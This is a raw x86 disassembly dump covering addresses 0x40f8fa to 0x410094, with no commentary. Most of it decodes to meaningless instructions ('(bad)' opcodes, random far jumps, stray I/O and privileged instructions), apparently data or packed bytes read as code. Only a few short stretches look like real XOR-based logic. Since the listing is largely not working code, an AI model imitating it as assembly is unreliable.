  40f8fa:	loope  0x40f884
  40f8fc:	and    ebp,DWORD PTR [ecx]
  40f8fe:	mov    eax,ds:0xa218b257
  40f903:	out    0x7,al
  40f905:	sbb    BYTE PTR [eax-0x6c],dl
  40f908:	mov    ah,0x86
  40f90a:	adc    ebp,esp
  40f90c:	dec    esp
  40f90d:	scas   al,BYTE PTR es:[edi]
  40f90e:	add    al,0xf
  40f910:	inc    ebp
  40f911:	out    0xc9,al
  40f913:	dec    esp
  40f914:	stos   WORD PTR es:[edi],ax
  40f916:	ss push esi
  40f918:	je     0x40f909
  40f91a:	xchg   DWORD PTR [esi-0x2a],esi
  40f91d:	cld    
  40f91e:	inc    esi
  40f91f:	je     0x40f93a
  40f921:	lock xor BYTE PTR [esi+ebx*4-0x6f5b5b5a],0x7e
  40f92a:	sub    DWORD PTR [edi+ebp*8],esi
  40f92d:	mov    dh,0x42
  40f92f:	(bad)  
  40f930:	fcmovnbe st,st(7)
  40f932:	adc    ah,al
  40f934:	cmp    BYTE PTR ds:0x7f430e77,dh
  40f93a:	sub    DWORD PTR [ecx+0x5a],edi
  40f93d:	or     al,0x17
  40f93f:	add    al,bh
  40f941:	mov    DWORD PTR [eax],ecx
  40f943:	or     DWORD PTR [eax-0x7b4966d0],0x2118b831
  40f94d:	std    
  40f94e:	adc    eax,0x16d51b07
  40f953:	ja     0x40f98a
  40f955:	adc    esp,ecx
  40f957:	popa   
  40f958:	mov    ebp,0xd1e0d1e8
  40f95d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f95e:	dec    edx
  40f95f:	outs   dx,DWORD PTR ds:[esi]
  40f960:	or     DWORD PTR [eax+0x9],0x6241a9af
  40f967:	ffree  st(1)
  40f969:	pop    ds
  40f96a:	int    0x7a
  40f96c:	std    
  40f96d:	imul   sp,bx,0xffda
  40f971:	dec    ecx
  40f972:	stos   BYTE PTR es:[edi],al
  40f973:	mov    al,ds:0xb01970be
  40f978:	jecxz  0x40f9a3
  40f97a:	mov    ds:0x1a1d561d,eax
  40f97f:	xchg   edx,eax
  40f980:	or     BYTE PTR [eax],bl
  40f982:	gs mov eax,0xadd3b176
  40f988:	iret   
  40f989:	jecxz  0x40f998
  40f98b:	push   ebx
  40f98c:	les    esi,FWORD PTR [eax+0x50]
  40f98f:	leave  
  40f990:	das    
  40f991:	pop    eax
  40f992:	clc    
  40f993:	arpl   WORD PTR [ecx+ebx*1-0x69],bx
  40f997:	(bad)  
  40f998:	adc    DWORD PTR ds:0x838e1cb0,edi
  40f99e:	aaa    
  40f99f:	sub    edi,ebp
  40f9a1:	pop    ds
  40f9a2:	iret   
  40f9a3:	jmp    0x91e91ec4
  40f9a8:	pop    edx
  40f9a9:	je     0x40f930
  40f9ab:	(bad)  
  40f9ad:	scas   eax,DWORD PTR es:[edi]
  40f9ae:	xor    bh,BYTE PTR [ebp+ebp*4+0x781de5c7]
  40f9b5:	dec    edx
  40f9b6:	sbb    ebp,DWORD PTR [edx+0x1df86a0d]
  40f9bc:	adc    ch,dl
  40f9be:	repz mov al,0xd7
  40f9c1:	scas   eax,DWORD PTR es:[edi]
  40f9c2:	sub    esp,eax
  40f9c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9c5:	lods   eax,DWORD PTR ds:[esi]
  40f9c6:	push   0x43
  40f9c8:	push   ebx
  40f9c9:	inc    esp
  40f9ca:	(bad)  
  40f9cb:	pop    ss
  40f9cc:	loope  0x40f9a1
  40f9ce:	gs mov ah,0x70
  40f9d1:	jno    0x40f9df
  40f9d3:	xor    al,0x56
  40f9d5:	adc    esi,DWORD PTR ds:0x433777
  40f9db:	mov    esi,DWORD PTR [ebp-0x8]
  40f9de:	movzx  ecx,BYTE PTR ds:0x43377b
  40f9e5:	adc    DWORD PTR ds:0x433833,ecx
  40f9eb:	mov    edx,0x7510854
  40f9f0:	xor    eax,edx
  40f9f2:	xor    ecx,0x76d3
  40f9f8:	xor    esi,edx
  40f9fa:	mov    ecx,0x32729b
  40f9ff:	jmp    0x40fcce
  40fa04:	mov    eax,ds:0x696d6976
  40fa09:	jno    0x40f9ac
  40fa0b:	jb     0x40fa43
  40fa0d:	inc    eax
  40fa0e:	pop    eax
  40fa0f:	outs   dx,DWORD PTR ds:[esi]
  40fa10:	(bad)  
  40fa11:	addr16 fdivrp st(2),st
  40fa14:	or     esi,DWORD PTR [ebp+0x7cac7e7e]
  40fa1a:	jle    0x40fa9a
  40fa1c:	icebp  
  40fa1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa1e:	push   0xcef07ca
  40fa23:	ds sub eax,0xbaec7e6
  40fa29:	test   al,0x6a
  40fa2b:	(bad)  
  40fa2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa2d:	xchg   BYTE PTR cs:[eax],dl
  40fa30:	mov    bl,0x41
  40fa32:	push   eax
  40fa33:	pop    eax
  40fa34:	mov    ds:0x8a1cb4db,eax
  40fa39:	cmp    eax,0x6a939fc7
  40fa3e:	mov    esi,0xd1dd746
  40fa43:	mov    bl,BYTE PTR [edi]
  40fa45:	add    BYTE PTR [ebx+0x33],ah
  40fa48:	sar    BYTE PTR [edi-0x66],cl
  40fa4b:	bound  esi,QWORD PTR [edx-0x66]
  40fa4e:	fcom   QWORD PTR [esp+ebx*2-0x1f25588b]
  40fa55:	jge    0x40fa9c
  40fa57:	lock mov ds,WORD PTR [edi+0x3c4f09bc]
  40fa5e:	es jbe 0x40fa20
  40fa61:	fdivr  QWORD PTR [ebx]
  40fa63:	push   es
  40fa64:	or     DWORD PTR [ecx],ecx
  40fa66:	add    eax,0xace23b77
  40fa6b:	sub    BYTE PTR [edi+0x59],al
  40fa6e:	ret    0x20c1
  40fa71:	jne    0x40fa16
  40fa73:	add    DWORD PTR [edi+0x1196c42e],edi
  40fa79:	jge    0x40fa05
  40fa7b:	mov    esp,0x845cd31b
  40fa80:	int3   
  40fa81:	or     edi,DWORD PTR [edi-0x41]
  40fa84:	(bad)  
  40fa85:	fwait
  40fa86:	hlt    
  40fa87:	or     ecx,ebx
  40fa89:	xchg   ebp,eax
  40fa8a:	or     al,0xf8
  40fa8c:	push   0xb352b62a
  40fa91:	cwde   
  40fa92:	sti    
  40fa93:	nop
  40fa94:	xchg   ecx,eax
  40fa95:	push   ebx
  40fa96:	in     al,0x16
  40fa98:	xchg   ecx,eax
  40fa99:	retf   0x1182
  40fa9c:	jnp    0x40fa6f
  40fa9e:	bound  edi,QWORD PTR [edx+esi*4]
  40faa1:	fbstp  TBYTE PTR [ebp-0x26d4d2fc]
  40faa7:	cld    
  40faa8:	jbe    0x40facb
  40faaa:	xor    al,0x32
  40faac:	dec    edi
  40faad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faae:	outs   dx,DWORD PTR ds:[esi]
  40faaf:	mov    esp,0xa2a29b82
  40fab4:	neg    DWORD PTR [ecx-0x42]
  40fab7:	mul    DWORD PTR [ebx+0x50421718]
  40fabd:	call   0x1d6e7089
  40fac2:	popa   
  40fac3:	retf   
  40fac4:	stos   DWORD PTR es:[edi],eax
  40fac5:	mov    ah,0x77
  40fac7:	mov    dh,0xae
  40fac9:	es dec esp
  40facb:	sub    ebp,DWORD PTR [eax+0x2426bf27]
  40fad1:	fimul  WORD PTR [esi+0x34d11012]
  40fad7:	jp     0x40fa77
  40fad9:	fstp   TBYTE PTR [ebx]
  40fadb:	or     DWORD PTR [edi+0x21],edx
  40fade:	ss xchg bx,ax
  40fae1:	and    edx,DWORD PTR [edx]
  40fae3:	push   ds
  40fae4:	sub    DWORD PTR [esi+0x28],esi
  40fae7:	paddusb mm4,QWORD PTR [ebx+0x6468c1b]
  40faee:	arpl   WORD PTR [ebx-0x82bae9d],cx
  40faf4:	xchg   ebx,eax
  40faf5:	cmp    WORD PTR [ecx],bp
  40faf8:	mov    WORD PTR [esp+ecx*1+0x73],ss
  40fafc:	fwait
  40fafd:	xchg   edi,eax
  40fafe:	mov    ds:0xbd32fd21,eax
  40fb03:	in     eax,dx
  40fb04:	repz test DWORD PTR [edi-0x6c8177c3],edi
  40fb0b:	jae    0x40fad2
  40fb0d:	shl    DWORD PTR [ecx],cl
  40fb0f:	or     BYTE PTR [edi-0x79],al
  40fb12:	mov    ah,0xeb
  40fb14:	and    al,0x6
  40fb16:	pusha  
  40fb17:	xlat   BYTE PTR ds:[ebx]
  40fb18:	jmp    0x41d5:0x35fdb814
  40fb1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb20:	pusha  
  40fb21:	pop    eax
  40fb22:	call   0x33d7:0xfb446dc1
  40fb29:	stos   DWORD PTR es:[edi],eax
  40fb2a:	cs pop esi
  40fb2c:	push   ebx
  40fb2d:	addr16 popf 
  40fb2f:	mov    ebx,0xf141687d
  40fb34:	(bad)  
  40fb35:	mov    ebx,0x823c392e
  40fb3a:	or     al,0x1b
  40fb3c:	addr16 xor ah,al
  40fb3f:	xor    DWORD PTR [edx-0x50],ecx
  40fb42:	mov    WORD PTR [esi],?
  40fb44:	(bad)  
  40fb46:	lods   al,BYTE PTR ds:[esi]
  40fb47:	sub    cl,ch
  40fb49:	sbb    ebp,ebp
  40fb4b:	shr    ebp,0x61
  40fb4e:	aaa    
  40fb4f:	mov    ds:0xba1aeb49,eax
  40fb54:	mov    eax,ds:0xf3e4c729
  40fb59:	out    0xaf,eax
  40fb5b:	mov    esi,0xfe4dc440
  40fb60:	mov    ds,edx
  40fb62:	cdq    
  40fb63:	ins    BYTE PTR es:[edi],dx
  40fb64:	mov    esi,0xca8076b9
  40fb69:	or     DWORD PTR ds:0xcf062fb1,edx
  40fb6f:	inc    ecx
  40fb70:	int    0x5
  40fb72:	loop   0x40fb31
  40fb74:	es int3 
  40fb76:	push   ecx
  40fb77:	jbe    0x40fbb8
  40fb79:	popa   
  40fb7a:	xchg   BYTE PTR [ebp+0x6c53812],ch
  40fb80:	ror    BYTE PTR ss:[ebp+0x21],0x7e
  40fb85:	pusha  
  40fb86:	in     eax,dx
  40fb87:	pop    ebx
  40fb88:	(bad)  
  40fb89:	sub    DWORD PTR [ecx],ebp
  40fb8b:	repnz aad 0x8e
  40fb8e:	mov    ah,0xf8
  40fb90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb91:	fst    DWORD PTR [esi]
  40fb93:	mov    ah,0x1
  40fb95:	jmp    0x40fb68
  40fb97:	jns    0x40fba0
  40fb99:	imul   edx,edi,0x0
  40fb9c:	ss push cs
  40fb9e:	mov    dl,0x7
  40fba0:	ins    BYTE PTR es:[edi],dx
  40fba1:	add    BYTE PTR [edi],0x16
  40fba4:	or     DWORD PTR [eax+0x7474d1bc],0xffffffba
  40fbab:	(bad)  
  40fbac:	loopne 0x40fbc3
  40fbae:	jnp    0x40fb64
  40fbb0:	sbb    cl,BYTE PTR [edi]
  40fbb2:	or     al,0x53
  40fbb4:	pop    esp
  40fbb5:	mov    cl,0x64
  40fbb7:	cmp    ebx,DWORD PTR ds:0xf41186ad
  40fbbd:	push   esp
  40fbbe:	les    edi,FWORD PTR [edi]
  40fbc0:	ss in  al,dx
  40fbc2:	(bad)  
  40fbc3:	fwait
  40fbc4:	cmp    ebp,DWORD PTR [ebp+0x39]
  40fbc7:	pop    eax
  40fbc8:	popa   
  40fbc9:	jp     0x40fb7c
  40fbcb:	sbb    BYTE PTR ds:0xab441690,ch
  40fbd1:	leave  
  40fbd2:	add    DWORD PTR [esi+0x48],edi
  40fbd5:	scas   eax,DWORD PTR es:[edi]
  40fbd6:	dec    ecx
  40fbd7:	inc    ebp
  40fbd8:	mov    edi,ecx
  40fbda:	fcomp  QWORD PTR [ebp+0x239388f4]
  40fbe0:	rcl    BYTE PTR [ecx+ebp*4],0xa3
  40fbe4:	lock push esp
  40fbe6:	idiv   ebx
  40fbe8:	idiv   BYTE PTR [eax-0x2de32d45]
  40fbee:	icebp  
  40fbef:	cmp    BYTE PTR [ebx],al
  40fbf1:	repz inc esp
  40fbf3:	pusha  
  40fbf4:	inc    esi
  40fbf5:	or     al,0xf6
  40fbf7:	mov    ds:0xef1113ce,al
  40fbfc:	cmp    eax,DWORD PTR [edi]
  40fbfe:	xchg   esp,eax
  40fbff:	lock outs dx,DWORD PTR ds:[esi]
  40fc01:	push   ebp
  40fc02:	jnp    0x40fc5e
  40fc04:	int3   
  40fc05:	mov    ah,0xf3
  40fc07:	wrmsr  
  40fc09:	shl    DWORD PTR [eax+0x5f9456fd],1
  40fc0f:	add    BYTE PTR [edx+ecx*8+0x1cbd4933],0x72
  40fc17:	or     cl,ch
  40fc19:	shl    BYTE PTR [ecx-0x37],0x29
  40fc1d:	dec    ebp
  40fc1e:	jnp    0x40fc3d
  40fc20:	jmp    0xd1f00d0d
  40fc25:	(bad)  
  40fc26:	addr16 add cl,bl
  40fc29:	das    
  40fc2a:	mov    eax,0xa0ad48da
  40fc2f:	ins    BYTE PTR es:[edi],dx
  40fc30:	fild   QWORD PTR [edi+0xd388cf8]
  40fc36:	ret    
  40fc37:	fstp   DWORD PTR [esi]
  40fc39:	das    
  40fc3a:	mov    dl,0xad
  40fc3c:	pop    es
  40fc3d:	mov    esp,0xb8b68a9f
  40fc42:	push   esp
  40fc43:	nop
  40fc44:	mov    ds:0xd1457474,al
  40fc49:	les    edx,FWORD PTR [ecx+0x3a]
  40fc4c:	add    al,0xf5
  40fc4e:	(bad)  
  40fc50:	mov    al,0x4e
  40fc52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc53:	xchg   ecx,eax
  40fc54:	ror    DWORD PTR [eax+0x2e4fc66e],0x9d
  40fc5b:	cmp    eax,0x969d110
  40fc60:	mov    esp,0x59b9c8c1
  40fc65:	xlat   BYTE PTR ds:[ebx]
  40fc66:	mov    cl,0x12
  40fc68:	loopne 0x40fc69
  40fc6a:	out    0xef,eax
  40fc6c:	int    0xc0
  40fc6e:	add    BYTE PTR [ecx+0x475905e4],dl
  40fc74:	xor    edx,eax
  40fc76:	mov    ebx,DWORD PTR [ecx+0x5660eb0c]
  40fc7c:	jl     0x40fcbe
  40fc7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc7f:	test   DWORD PTR [esi],ebx
  40fc81:	inc    ebx
  40fc82:	loope  0x40fc92
  40fc84:	popa   
  40fc85:	or     edx,DWORD PTR [ecx-0x6a]
  40fc88:	xor    BYTE PTR [ebx-0xdfce95b],bh
  40fc8e:	je     0x40fd04
  40fc90:	jl     0x40fc64
  40fc92:	scas   al,BYTE PTR es:[edi]
  40fc93:	dec    ecx
  40fc94:	cmp    bh,BYTE PTR [edi-0x75]
  40fc97:	push   esp
  40fc98:	mov    dl,0x6c
  40fc9a:	and    eax,0xc8b4fc8e
  40fc9f:	(bad)  
  40fca3:	jae    0x40fd12
  40fca5:	mov    cl,0x57
  40fca7:	ss dec ebx
  40fca9:	imul   ebx,ebp,0xffffffc7
  40fcac:	test   DWORD PTR [eax-0x7b],edi
  40fcaf:	addr16 ret 0x184b
  40fcb3:	out    0x3,eax
  40fcb5:	jno    0x40fd35
  40fcb7:	or     dl,bl
  40fcb9:	aas    
  40fcba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcbb:	ds aaa 
  40fcbd:	in     eax,0x7f
  40fcbf:	fwait
  40fcc0:	ins    DWORD PTR es:[edi],dx
  40fcc1:	lahf   
  40fcc2:	imul   ecx,ebp,0x372f6adb
  40fcc8:	pop    ebx
  40fcc9:	push   ebp
  40fcca:	inc    eax
  40fccb:	cmp    DWORD PTR [ecx+edi*8-0x3efc0efd],0xffffffe9
  40fcd3:	retf   0x2
  40fcd6:	add    al,dh
  40fcd8:	sub    DWORD PTR [ebx-0x20],esp
  40fcdb:	arpl   WORD PTR [eax+0x71],si
  40fcde:	sub    ebp,esi
  40fce0:	scas   eax,DWORD PTR es:[edi]
  40fce1:	ret    
  40fce2:	shr    DWORD PTR [ecx],0xc4
  40fce5:	sbb    bh,BYTE PTR [edx]
  40fce7:	mov    ecx,0xac7e7eb3
  40fcec:	jl     0x40fd6c
  40fcee:	jle    0x40fd40
  40fcf0:	ds adc eax,0x72fc67c7
  40fcf6:	sbb    bh,bh
  40fcf8:	dec    ecx
  40fcf9:	loope  0x40fd5b
  40fcfb:	add    eax,0x2c90da17
  40fd00:	xchg   ecx,eax
  40fd01:	jge    0x40fd17
  40fd03:	pop    edi
  40fd04:	aam    0x1a
  40fd06:	jnp    0x40fd59
  40fd08:	daa    
  40fd09:	pop    eax
  40fd0a:	std    
  40fd0b:	cdq    
  40fd0c:	fldcw  WORD PTR [eax]
  40fd0e:	adc    al,ah
  40fd10:	pushf  
  40fd11:	fild   DWORD PTR [ebx]
  40fd13:	shl    cl,0xb1
  40fd16:	jae    0x40fd65
  40fd18:	pushf  
  40fd19:	rcr    bh,cl
  40fd1b:	push   ebp
  40fd1c:	ret    0x199b
  40fd1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd20:	pusha  
  40fd21:	(bad)  
  40fd22:	fidivr DWORD PTR [esi-0x395b924b]
  40fd28:	or     eax,0xd11530af
  40fd2d:	cs pop ss
  40fd2f:	call   0x946712b5
  40fd34:	inc    esi
  40fd35:	mov    BYTE PTR [ebx+ebx*2+0x6b91e71f],al
  40fd3c:	bound  eax,QWORD PTR [eax+edx*1-0x4d]
  40fd40:	test   al,0x66
  40fd42:	in     al,dx
  40fd43:	sub    al,0x8f
  40fd45:	popa   
  40fd46:	hlt    
  40fd47:	and    DWORD PTR [ecx-0x2c7f442f],ecx
  40fd4d:	sti    
  40fd4e:	mov    ds,WORD PTR [ebx-0x32]
  40fd51:	retf   
  40fd52:	sbb    DWORD PTR ds:0xa7a7a251,0x54566c4e
  40fd5c:	adc    DWORD PTR [ebx+0x63753634],ecx
  40fd62:	ins    BYTE PTR es:[edi],dx
  40fd63:	mov    DWORD PTR [esi-0x1],edx
  40fd66:	jae    0x40fd2b
  40fd68:	inc    eax
  40fd69:	jnp    0x40fd88
  40fd6b:	jle    0x40fd7b
  40fd6d:	jae    0x40fdbd
  40fd6f:	loope  0x40fdb1
  40fd71:	lea    esi,[esi]
  40fd73:	call   0xfab1:0x8f123c1d
  40fd7a:	jno    0x40fdd7
  40fd7c:	and    edi,DWORD PTR [edx-0x1e431962]
  40fd82:	fdiv   QWORD PTR [eax+0xc]
  40fd85:	ja     0x40fdca
  40fd87:	out    0xca,al
  40fd89:	xchg   DWORD PTR [ecx],esi
  40fd8b:	aaa    
  40fd8c:	xchg   ebp,eax
  40fd8d:	in     eax,dx
  40fd8e:	jmp    0xc766:0xc61fe78d
  40fd95:	cdq    
  40fd96:	pop    ebp
  40fd97:	mov    cl,0xe4
  40fd99:	fs pop ecx
  40fd9b:	xor    eax,edx
  40fd9d:	cmp    al,0x68
  40fd9f:	imul   eax,DWORD PTR [ebp+ecx*8-0x2b],0xffffffa7
  40fda4:	test   bh,0x2c
  40fda7:	jp     0x40fe08
  40fda9:	pop    eax
  40fdaa:	dec    edi
  40fdab:	jge    0x40fdff
  40fdad:	jae    0x40fdc1
  40fdaf:	mov    ecx,0xeaae93fa
  40fdb4:	test   DWORD PTR [eax+eax*8-0x4f],ecx
  40fdb8:	cmp    bl,cl
  40fdba:	fldenv [ecx+0x68]
  40fdbd:	jno    0x40fd3f
  40fdbf:	or     al,0x2f
  40fdc1:	pop    ebp
  40fdc2:	lahf   
  40fdc3:	pop    ds
  40fdc4:	adc    al,0x58
  40fdc6:	dec    ebx
  40fdc7:	or     ecx,DWORD PTR [edx+0x3a633c23]
  40fdcd:	shl    ebp,0xe
  40fdd0:	cmc    
  40fdd1:	cmc    
  40fdd2:	cmp    dl,BYTE PTR [edx]
  40fdd4:	addr16 hlt 
  40fdd6:	add    esp,DWORD PTR [edx-0x3dd880cd]
  40fddc:	push   0x11228e18
  40fde1:	call   0x6fc6:0x3367bb4a
  40fde8:	sub    ah,BYTE PTR [eax+0x57]
  40fdeb:	hlt    
  40fdec:	stos   DWORD PTR es:[edi],eax
  40fded:	stc    
  40fdee:	jmp    0xb231:0x897b11c6
  40fdf5:	sbb    al,0x23
  40fdf7:	enter  0x2776,0x13
  40fdfb:	xor    ebp,DWORD PTR [esi-0x57]
  40fdfe:	jg     0x40fd86
  40fe00:	arpl   WORD PTR [ecx-0xd],ax
  40fe03:	ret    0x4cc8
  40fe06:	into   
  40fe07:	ss xchg esp,eax
  40fe09:	pop    eax
  40fe0a:	mov    ecx,DWORD PTR [ebx-0x5e]
  40fe0d:	jb     0x40fda5
  40fe0f:	dec    edi
  40fe10:	jle    0x40fe43
  40fe12:	push   0xffffffac
  40fe14:	loop   0x40fd9c
  40fe16:	mov    dh,0x46
  40fe18:	dec    esp
  40fe19:	mov    bl,0x27
  40fe1b:	mov    cl,0xf9
  40fe1d:	xchg   edi,eax
  40fe1e:	push   eax
  40fe1f:	or     bl,BYTE PTR [ebx+0x51]
  40fe22:	call   0x631d22b1
  40fe27:	and    al,0x7b
  40fe29:	sbb    eax,0x327393f7
  40fe2e:	shl    DWORD PTR [edi+0x7e],1
  40fe31:	mov    bl,0x43
  40fe33:	xor    bh,dl
  40fe35:	add    BYTE PTR [edi+ebp*2+0x1a],cl
  40fe39:	aas    
  40fe3a:	mov    eax,ds:0xccf4d3f2
  40fe3f:	mov    eax,ds:0x1bdfe9aa
  40fe44:	cld    
  40fe45:	mov    ebx,0xbe596b99
  40fe4a:	mov    ebp,0x35688779
  40fe4f:	test   eax,0x56ff87f9
  40fe54:	xchg   edi,eax
  40fe55:	add    eax,DWORD PTR [ebp+ecx*8+0x35]
  40fe59:	loope  0x40fdfc
  40fe5b:	jae    0x40fe16
  40fe5d:	adc    edi,DWORD PTR [edi-0x76f08d8]
  40fe63:	cs pop ecx
  40fe65:	sub    BYTE PTR es:[esi],bh
  40fe68:	pop    edx
  40fe69:	push   esi
  40fe6a:	cdq    
  40fe6b:	cmp    edx,DWORD PTR [eax]
  40fe6d:	test   eax,0x33ff2d26
  40fe72:	arpl   WORD PTR [ebx-0x18be0c16],bp
  40fe78:	mov    ebp,0x42e1fd74
  40fe7d:	retf   0xe33d
  40fe80:	mov    DWORD PTR [ecx+0x6656d6b5],esi
  40fe86:	aas    
  40fe87:	in     al,0x35
  40fe89:	rcr    BYTE PTR [ebx],1
  40fe8b:	inc    esp
  40fe8c:	in     al,0x51
  40fe8e:	je     0x40fec6
  40fe90:	sbb    al,0xfe
  40fe92:	scas   al,BYTE PTR es:[edi]
  40fe93:	fsub   st,st(3)
  40fe95:	shr    BYTE PTR [eax-0x22f60396],0xb9
  40fe9c:	leave  
  40fe9d:	in     eax,dx
  40fe9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe9f:	dec    edi
  40fea0:	shl    BYTE PTR [esi],0x48
  40fea3:	and    eax,0xa3ca607d
  40fea8:	push   edi
  40fea9:	adc    BYTE PTR [ebx+0x30fdacd],bl
  40feaf:	add    esp,0x6e189f58
  40feb5:	ret    0x187c
  40feb8:	stos   BYTE PTR es:[edi],al
  40feb9:	adc    BYTE PTR [ebx-0x80],0x6
  40febd:	adc    edi,esi
  40febf:	push   ebp
  40fec0:	cdq    
  40fec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fec2:	mov    ch,0x7e
  40fec4:	test   al,0x32
  40fec6:	fmul   DWORD PTR [edx+0x36]
  40fec9:	add    eax,0x60ffb68
  40fece:	mov    ds:0xb04d9b14,al
  40fed3:	mov    edx,0x1130230d
  40fed8:	nop
  40fed9:	std    
  40feda:	push   ss
  40fedb:	cmp    eax,0xdd918554
  40fee0:	int3   
  40fee1:	xchg   edi,eax
  40fee2:	jne    0x40ff39
  40fee4:	sub    al,0xfd
  40fee6:	not    DWORD PTR [edx+0x40]
  40fee9:	sbb    eax,0x21ea8b94
  40feee:	pusha  
  40feef:	add    ebp,ebp
  40fef1:	push   esp
  40fef2:	cmp    eax,0xebc764fd
  40fef7:	pop    ebp
  40fef8:	or     ebx,ecx
  40fefa:	sub    DWORD PTR [edi+0x1],ecx
  40fefd:	call   0x54073f0f
  40ff02:	in     eax,dx
  40ff03:	shl    BYTE PTR [eax-0x75871470],cl
  40ff09:	jp     0x40ff16
  40ff0b:	aam    0xf
  40ff0d:	mov    ecx,0x20eba34d
  40ff12:	and    BYTE PTR ds:0xeb9c2de3,al
  40ff18:	imul   edx,edi,0xc74a9500
  40ff1e:	sub    ebx,esp
  40ff20:	les    esp,FWORD PTR [edi+0x1]
  40ff23:	mov    ch,0xd3
  40ff25:	jno    0x40ff20
  40ff27:	ds push ss
  40ff29:	repnz push es
  40ff2b:	inc    esi
  40ff2c:	sub    eax,0x44b77c4f
  40ff31:	outs   dx,DWORD PTR ds:[esi]
  40ff32:	pop    edi
  40ff33:	enter  0xd572,0xa4
  40ff37:	(bad)  
  40ff39:	ins    BYTE PTR es:[edi],dx
  40ff3a:	shl    BYTE PTR [edi],cl
  40ff3c:	mov    edx,0x9523b4de
  40ff41:	jbe    0x40ff2e
  40ff43:	das    
  40ff44:	inc    edx
  40ff45:	and    DWORD PTR [ecx],ebp
  40ff47:	dec    eax
  40ff48:	add    al,0x3f
  40ff4a:	adc    eax,0x4482f7f0
  40ff4f:	mov    ah,bh
  40ff51:	jmp    0xbdeb1652
  40ff56:	mov    ebp,0x1558fd1c
  40ff5b:	xchg   ebp,eax
  40ff5c:	nop
  40ff5d:	and    eax,0xb69737fe
  40ff62:	rol    DWORD PTR [eax-0x5294f4bb],cl
  40ff68:	bound  edx,QWORD PTR [esi-0x74]
  40ff6b:	add    BYTE PTR [esi+0x5abe287a],bl
  40ff71:	and    ah,ah
  40ff73:	sub    BYTE PTR [edx-0x3d],bl
  40ff76:	mov    ebp,0x2410dbd8
  40ff7b:	push   ss
  40ff7c:	sub    ebx,edi
  40ff7e:	xor    ebp,DWORD PTR [edx-0x2f]
  40ff81:	jo     0x40ff25
  40ff83:	or     edx,DWORD PTR [ebx]
  40ff85:	adc    eax,0x8357f3e3
  40ff8a:	inc    edi
  40ff8b:	pop    esi
  40ff8c:	call   DWORD PTR [eax+0x6da185e1]
  40ff92:	cwde   
  40ff93:	push   es
  40ff94:	repz add esp,DWORD PTR [esi+ebp*8-0x3]
  40ff99:	pop    es
  40ff9a:	xor    DWORD PTR [ecx+0xf58d13c],edi
  40ffa0:	mov    edx,0x8bc6af0f
  40ffa5:	jne    0x40ffb3
  40ffa7:	mov    DWORD PTR ds:0x433723,0x6048
  40ffb1:	cmp    esi,eax
  40ffb3:	jne    0x4102bc
  40ffb9:	mov    eax,DWORD PTR [ebp-0x4]
  40ffbc:	sbb    DWORD PTR ds:0x4337e7,0x14e6
  40ffc6:	jmp    0x410295
  40ffcb:	inc    eax
  40ffcc:	sbb    BYTE PTR [esi+0x407076f6],dh
  40ffd2:	test   al,0x4a
  40ffd4:	add    eax,0xde5339b1
  40ffd9:	hlt    
  40ffda:	dec    edx
  40ffdb:	idiv   DWORD PTR [esi+0x7cac7e7e]
  40ffe1:	jle    0x410061
  40ffe3:	cli    
  40ffe4:	inc    ebx
  40ffe5:	cmp    esi,DWORD PTR [ebp+0x7dd08958]
  40ffeb:	add    dl,dl
  40ffed:	shr    DWORD PTR [edi+0x139f1c7b],1
  40fff3:	push   esi
  40fff4:	pop    edi
  40fff5:	lods   eax,DWORD PTR ds:[esi]
  40fff6:	sbb    dh,bl
  40fff8:	xor    BYTE PTR [edx+0x4241a13d],dl
  40fffe:	xchg   edx,eax
  40ffff:	div    DWORD PTR [esi+ebx*8+0x7beefe45]
  410006:	fld    QWORD PTR [ecx]
  410008:	and    al,0xd4
  41000a:	jmp    0x119d:0xad3b6f63
  410011:	add    bh,BYTE PTR [ecx]
  410013:	shl    DWORD PTR [esi-0xe8fb46f],cl
  410019:	xchg   DWORD PTR [esi],ebx
  41001b:	mov    ds:0xc4ae61ff,al
  410020:	inc    esp
  410021:	rcl    edi,cl
  410023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410024:	neg    DWORD PTR [edx-0x2a]
  410027:	(bad)  
  410028:	push   ecx
  410029:	sub    DWORD PTR [ecx+esi*4+0x5031a277],edx
  410030:	pop    ss
  410031:	int3   
  410032:	mov    BYTE PTR [esi+0x46d0d888],ah
  410038:	sub    al,0xd5
  41003a:	jo     0x40ffea
  41003c:	ret    
  41003d:	nop
  41003e:	sti    
  41003f:	jae    0x41005b
  410041:	stc    
  410042:	test   DWORD PTR [edi],0xcc18f9fe
  410048:	rcr    DWORD PTR [eax],1
  41004a:	(bad)  
  41004b:	and    eax,0x276ac8ce
  410050:	push   esi
  410051:	push   ss
  410052:	imul   esp,DWORD PTR [edi],0x9762632f
  410058:	dec    ebp
  410059:	lods   eax,DWORD PTR ds:[esi]
  41005a:	mov    ch,0x51
  41005c:	inc    edx
  41005d:	add    eax,DWORD PTR [ecx-0x50]
  410060:	retf   0x3d1a
  410063:	cmp    al,0xd5
  410065:	jge    0x4100d2
  410067:	cld    
  410068:	mov    esi,0x5f38c07a
  41006d:	mov    dh,0xa1
  41006f:	pop    esp
  410070:	pop    ds
  410071:	sub    BYTE PTR [edx+0x33974d4b],cl
  410077:	xchg   esi,eax
  410078:	push   eax
  410079:	mov    ?,ebx
  41007b:	mov    BYTE PTR [edx+0x56],bl
  41007e:	jno    0x4100ab
  410080:	int    0x22
  410082:	fdivr  DWORD PTR [esi]
  410084:	push   ds
  410085:	pop    eax
  410086:	dec    edi
  410087:	jno    0x4100c7
  410089:	sar    DWORD PTR [edx+0x7b388b37],1
  41008f:	xor    BYTE PTR [esi],dh
  410091:	ret    
  410092:	inc    ecx
  410093:	(bad)  
  410094:	fnstsw WORD PTR [ebp+0x2d]
